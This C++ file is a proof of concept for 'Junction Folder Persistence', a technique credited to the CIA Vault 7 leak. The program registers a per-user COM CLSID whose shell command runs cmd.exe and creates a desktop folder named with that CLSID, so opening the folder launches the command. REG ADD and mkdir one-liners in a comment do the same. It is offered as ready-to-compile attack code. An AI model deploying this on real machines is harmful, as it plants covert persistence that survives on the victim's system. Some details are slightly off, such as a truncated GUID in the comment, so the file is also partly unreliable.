#include "stdafx.h"
#include <iostream>
#include "Windows.h"


using namespace std;
DWORD lBn;
DWORD lRb;
HKEY hKey;
/*

HKCU\Software\Classes\CLSID\{My GUID}\Shell\Manage\Command
REG ADD HKCU\Software\Classes\CLSID\{330f76dd-3b73-486c-a9ae-e80735e95f15}\Shell\Manage\Command /ve /t REG_SZ /d "%windir%\System32\cmd.exe"
mkdir C:\Users\%username%\Desktop\POC.{330f76dd-3b73-486c-a9ae-e80735e95f1}

Use Visual Studio 2015 to comple and change username to your conveniance :)  
*/

int main() {
	printf("\n");
	printf("========================================================\n");
	printf("-- Junction Folder Persistence\n");
	printf("-- https://wikileaks.org/ciav7p1/cms/page_13763373.html\n");
	printf("-- poc by Chaitanya Haritash :)\n");
	printf("========================================================\n");
	printf("\n");
	LPCSTR key = "Software\\Classes\\CLSID\\{330f76dd-3b73-486c-a9ae-e80735e95f15}\\Shell\\Manage\\Command";
	LPCSTR val = "stringVal";
	LPCSTR path = "C:\\Users\\tuktuk\\Desktop\\POC.{330f76dd-3b73-486c-a9ae-e80735e95f15}";
	DWORD dwDisposition;
	lBn = RegCreateKeyEx(HKEY_CURRENT_USER, key, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition);
	lRb = RegSetKeyValue(HKEY_CURRENT_USER, key, val, REG_SZ, (LPCVOID)"C:\\Windows\\system32\\cmd.exe", MAX_PATH);
	if (lBn == ERROR_SUCCESS) {
		printf("\n-- Registery Created : %s\n",key);
		if (lRb == ERROR_SUCCESS) {
			printf("\n-- value set : C:\\Windows\\system32\\cmd.exe");
			CreateDirectory(path, NULL);
			printf("\n-- Junction Foldor Created : %s\n", path);
			printf("\n-- All SET !!\n");
		}
		else {
			printf("failed to set the value");
		}
	}
	else {
		printf("failed to inject\n");
	}
}
